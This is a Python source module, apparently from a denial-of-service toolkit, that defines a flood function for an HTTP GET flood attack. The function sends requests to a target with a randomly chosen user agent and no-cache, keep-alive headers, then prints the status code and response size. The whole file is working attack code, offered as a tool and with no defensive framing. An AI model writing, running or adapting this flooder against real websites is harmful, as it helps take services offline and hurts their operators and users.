"""This module provides the flood function for an HTTP GET request DoS attack."""

import json
import random
import requests
from colorama import Fore as F
from requests.exceptions import Timeout

# Load user agents
with open("tools/L7/user_agents.json", "r") as agents:
    user_agents = json.load(agents)["agents"]

# Default headers
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}

# Color codes
color_code = {True: F.GREEN, False: F.RED}

def flood(target: str) -> None:
    """Starts an HTTP GET request flood attack."""
    headers["User-agent"] = random.choice(user_agents)
    try:
        response = requests.get(target, headers=headers, timeout=4)
        status = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]{F.RESET}"
        payload_size = f"Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB{F.RESET}"
        print(f"{status} --> {payload_size}")
    except (Timeout, OSError):
        pass
